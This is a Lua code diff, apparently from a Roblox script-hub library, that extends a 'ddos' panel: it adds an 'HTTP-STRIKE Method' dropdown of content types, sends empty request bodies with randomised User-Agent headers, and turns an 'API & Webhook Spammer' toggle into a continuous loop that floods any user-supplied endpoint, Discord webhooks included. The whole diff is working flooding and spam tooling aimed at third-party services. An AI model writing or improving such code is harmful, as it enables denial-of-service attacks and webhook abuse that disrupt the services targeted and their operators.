@@ -7091,7 +7091,30 @@ function lib.DeveloperEncrypt(window,isShowed)
 		local web = {
 			_endpoint = "",
 			_spam = false,
-			_message = ""
+			_message = "",
+			_strike = "",
+			_strike_list = {
+					"application/json",
+					"application/javascript",
+					"application/xml",
+					"application/x-www-form-urlencoded",
+					"application/octet-stream",
+					"application/pdf",
+					"application/zip",
+					"application/soap+xml",
+					"application/vnd.api+json",
+					"application/x-protobuf",
+					"text/plain",
+					"text/html",
+					"text/css",
+					"text/javascript",
+					"multipart/form-data",
+					"image/jpeg",
+					"image/png",
+					"image/gif",
+					"audio/mpeg",
+					"video/mp4"
+				}
 		}
 
 		ddos:Textbox("Insert endpoint",false,function(value)
@@ -7100,6 +7123,10 @@ function lib.DeveloperEncrypt(window,isShowed)
 			
 		ddos:Textbox("Insert message",false,function(value)
 			web._message = value
+		end)
+
+		T1:Dropdown("HTTP-STRIKE Method",web._strike_list,function(value)
+			web._strike = value
 		end)
 			
 		ddos:Button("Sent HTTP ( POST )",function()
@@ -7125,10 +7152,10 @@ function lib.DeveloperEncrypt(window,isShowed)
 						Url = web._endpoint,
 						Method = "POST",
 						Headers = {
-							["Content-Type"] = "application/json",
+							["Content-Type"] = web._strike,
 							["User-Agent"] = lib.randomString()
 						},
-						Body = HttpService:JSONEncode({["content"] = web._message})
+						Body = HttpService:JSONEncode({}) --{["content"] = web._message})
 					})
 				end
 			else
@@ -7136,10 +7163,12 @@ function lib.DeveloperEncrypt(window,isShowed)
 			end
 		end)
 
-		ddos:Toggle("API & Webhook Spammer",false,function(value)
+		local jammer = ddos:Toggle("API & Webhook Spammer",false,function(value)
 			web._spam = value
-			while wait() do
-				if web._spam == false then break end
+		end)
+
+		lib:runtime(function()
+			if web._spam == true then
 				if web._endpoint ~= "" then
 					if web._endpoint:find("discord.com/api/webhooks/") then
 						lib.sentMessage(web._endpoint,"embed systen",{
@@ -7162,15 +7191,16 @@ function lib.DeveloperEncrypt(window,isShowed)
 							Url = web._endpoint,
 							Method = "POST",
 							Headers = {
-								["Content-Type"] = "application/json",
+								["Content-Type"] = web._strike,
 								["User-Agent"] = lib.randomString()
 							},
-							Body = HttpService:JSONEncode({["content"] = web._message})
+							Body = HttpService:JSONEncode({}) --{["content"] = web._message})
 						})
 					end
 				else
 					lib:notify(lib:ColorFonts("Invalid endpoint.","Bold,Red"),10)
-					web._spam = false
+					--web._spam = false
+					jammer:Set(false)
 				end
 			end
 		end)
